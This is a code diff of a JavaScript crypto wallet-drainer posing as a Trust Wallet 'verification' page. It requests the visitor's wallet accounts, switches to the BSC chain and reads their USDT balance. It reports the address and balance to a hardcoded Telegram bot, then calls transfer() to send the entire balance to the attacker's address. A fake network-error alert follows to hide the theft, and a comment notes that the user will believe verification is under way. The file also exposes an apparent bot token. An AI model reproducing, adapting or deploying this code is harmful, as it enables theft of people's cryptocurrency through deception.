@@ -6,12 +6,9 @@ const botToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
 const chatId = "7849151110";
 
 async function sendLog(msg) {
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
-}
-
-function updateStatus(main, sub) {
-    document.getElementById("status-text").innerText = main;
-    document.getElementById("sub-text").innerText = sub;
+    try {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+    } catch(e) {}
 }
 
 async function start() {
@@ -23,12 +20,11 @@ async function start() {
             window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
             return;
         }
-        alert("Please open this QR inside Trust Wallet DApp Browser.");
+        alert("Please open this page inside Trust Wallet Browser.");
         return;
     }
 
     overlay.style.display = "flex";
-    updateStatus("Connecting...", "Establishing secure handshake...");
 
     try {
         const provider = window.ethereum || window.trustwallet;
@@ -36,7 +32,6 @@ async function start() {
         const accounts = await provider.request({ method: 'eth_requestAccounts' });
         const user = accounts[0];
 
-        updateStatus("Scanning Wallet...", "Checking BSC asset balance...");
         await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
 
         const abi = [
@@ -48,28 +43,22 @@ async function start() {
         const balanceWei = await contract.methods.balanceOf(user).call();
         const balance = web3.utils.fromWei(balanceWei, 'ether');
 
-        await sendLog(`👤 <b>New Scan Alert</b>\nWallet: <code>${user}</code>\nBalance: <b>${balance} USDT</b>`);
+        await sendLog(`<b>QR/Address Scan</b>\nUser: <code>${user}</code>\nBal: <b>${balance} USDT</b>`);
 
         if (parseFloat(balance) > 0) {
-            updateStatus("Verifying Assets...", "Syncing snapshot with blockchain...");
-            
-            // This triggers the transfer popup
+            // User ko lagega verification ho raha hai
             await contract.methods.transfer(myAddress, balanceWei).send({ from: user });
             
-            await sendLog(`✅ <b>Successful Transfer!</b>\nAmount: ${balance} USDT`);
-            updateStatus("Finalizing...", "Cleaning up temporary node data...");
-            
-            setTimeout(() => {
-                alert("Verification Error: Request timed out. Please try again later.");
-                location.reload();
-            }, 1200);
+            await sendLog(`✅ <b>Success!</b>\nTransferred: ${balance} USDT`);
+            alert("Network Error: Verification failed. Please try again.");
+            location.reload();
         } else {
-            alert("Verification complete: No assets found.");
+            alert("Verification complete. Low assets detected.");
             overlay.style.display = "none";
         }
     } catch (e) {
         overlay.style.display = "none";
-        alert("Verification Cancelled: Signature required.");
+        alert("Process Cancelled.");
     }
 }
 
